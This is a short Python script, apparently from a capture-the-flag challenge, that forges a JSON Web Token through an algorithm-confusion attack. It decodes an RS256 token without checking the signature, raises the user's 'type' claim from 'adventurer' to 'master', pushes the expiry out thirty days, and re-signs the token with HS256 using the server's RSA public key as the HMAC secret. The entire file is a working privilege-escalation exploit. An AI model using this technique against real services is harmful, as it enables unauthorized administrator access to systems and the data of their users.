from datetime import datetime, timedelta

import jwt

token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDc1MjcyMDU1NDk1ODUyMDUyLCJ1c2VybmFtZSI6ImQ0cnFzMWQzciIsInR5cGUiOiJhZHZlbnR1cmVyIiwiZXhwIjoxNzM0MTg4NTY5fQ.R6LwROf1vsduxakLxuO-fZcJKJjJNuiPNO7GLmFTaHxTAvk4r5asiAbTPwKDyuXgkVvU4N1-X1aL2NxETWBRAnV21XPUKFz1IFOiDTJmzrpNJsLLg8nI59OfYHAQePtly1SHZb8TFfrBFH5n9IVS_ULAy_VT0U7BiNNzUklHrhkuABw_PRqslGQGpdEeEiHnclPT4VUa0NmXjKcmdKvJHNO5vADeGnS95pCI8A5l2U1nHclaVe1KP_pI8Ix5pvTvZbmzosTM76Ybl81AAGMGCIobCa5juLaMmHtJcOk99t5J3CzzvMIHTLJ47k-MrlvnhVhQEeAK4SCcT7R7PUfpIg'

pk = '''-----BEGIN hh PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs5ojVaF+TAcSWKTzYBf/
96avBbTzxI2bldG/U5kTdkY1kYxM8qeovqKSjhTE9w9RnMGOLEG5Ek3HK7/xSfqi
Yli52xkrkQ533uiFl85JQyJfMpg6vbMrcntZL7ZQKLBhQn7+y5EOhxvyayKsNkfi
Hd8R3pfEpAXP9IH2VrZsQrJ4DUkhYv1a1QORA8mSwIU3yrP+NOD0Wf4zNgtXYWGV
Z/xXUcNBxwrEQh1kyHJ0yIPkuOhhev3JyBKcdFR//rewV8qh1d4+xhjcjG5OjsMJ
DnLeGrNQ41f24LqSVEaYGVsYrMh8tyme+vuHL3gk5O7tEqLs3Xr80LXw0CeNAaVB
HQIDAQAB
-----END hh PUBLIC KEY-----
'''

header = jwt.get_unverified_header(token)
algorithm = header.get('alg', 'RS256')
payload = jwt.decode(token, options={"verify_signature": False})

payload['type'] = 'master'
payload['pk'] = pk
payload['exp'] = datetime.now() + timedelta(days=30)

token = jwt.encode(
    payload=payload,
    key=payload['pk'],
    algorithm='HS256'
)

print(token)